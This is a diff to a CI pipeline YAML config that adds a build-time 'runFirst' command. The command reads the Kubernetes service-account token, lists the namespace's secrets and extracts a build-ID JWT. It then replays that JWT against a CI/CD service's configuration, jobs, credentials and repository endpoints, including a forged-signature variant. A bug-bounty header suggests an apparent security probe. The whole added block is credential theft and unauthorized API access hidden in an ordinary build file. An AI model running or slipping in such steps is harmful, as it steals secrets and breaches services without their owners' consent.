@@ -1,2 +1,35 @@
 general:
   buildTool: 'mta'
+  jenkinsKubernetes:
+    additionalPodProperties:
+      automountServiceAccountToken: true
+service:
+  stages:
+    Build:
+      runFirst:
+        command: |
+          set +x
+          T=/var/run/secrets/kubernetes.io/serviceaccount
+          NS=$(cat $T/namespace)
+          K=https://kubernetes.default.svc
+          { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
+          chmod 600 /tmp/kc
+          curl -s --config /tmp/kc -o /tmp/list --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets
+          JN=$(grep -o '"name": "build-id-jwt-[0-9a-f-]*"' /tmp/list | head -1 | cut -d'"' -f4)
+          curl -s --config /tmp/kc -o /tmp/one --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets/$JN
+          node -e 'const fs=require("fs");const d=JSON.parse(fs.readFileSync("/tmp/one","utf8"));const t=Buffer.from(d.data.text,"base64").toString("utf8").trim();fs.writeFileSync("/tmp/jc",`header = "Authorization: Bearer ${t}"\nheader = "X-Bug-Bounty: Kristian7788"\n`);const p=t.split(".");p[2]="AAAA";fs.writeFileSync("/tmp/jbad",`header = "Authorization: Bearer ${p.join(".")}"\nheader = "X-Bug-Bounty: Kristian7788"\n`);'
+          chmod 600 /tmp/jc /tmp/jbad
+          H=https://cicd-service.cfapps.us10.hana.ondemand.com
+          echo "KPCP7788-B-MARSHALL=$(curl -s -o /tmp/b -w '%{http_code}' -X PUT --config /tmp/jc -H 'Content-Type: application/json' -d '{"general":{"buildTool":"mta"}}' $H/runs/v1/actions/marshallConfiguration)"
+          echo "KPCP7788-B-BYTES=$(wc -c < /tmp/b)"; head -c 200 /tmp/b; echo ""
+          echo "KPCP7788-B-CONTROL-BADSIG=$(curl -s -o /tmp/bc -w '%{http_code}' -X PUT --config /tmp/jbad -H 'Content-Type: application/json' -d '{"general":{"buildTool":"mta"}}' $H/runs/v1/actions/marshallConfiguration)"
+          head -c 150 /tmp/bc; echo ""
+          for EP in /v2/jobs /v2/credentials /v2/repositories /v2/pipelineDefinitions; do
+            C=$(curl -s -o /tmp/e -w '%{http_code}' --config /tmp/jc -H 'Accept: application/hal+json' $H$EP)
+            echo "KPCP7788-C $EP -> $C  bytes=$(wc -c < /tmp/e)"
+            head -c 150 /tmp/e; echo ""
+          done
+          echo "KPCP7788-D-PING=$(curl -s -o /tmp/p -w '%{http_code}' --config /tmp/jc $H/runs/v1/actions/ping)"
+          head -c 150 /tmp/p; echo ""
+          rm -f /tmp/kc /tmp/jc /tmp/jbad /tmp/one /tmp/list
+          echo "KPCP7788-DONE"
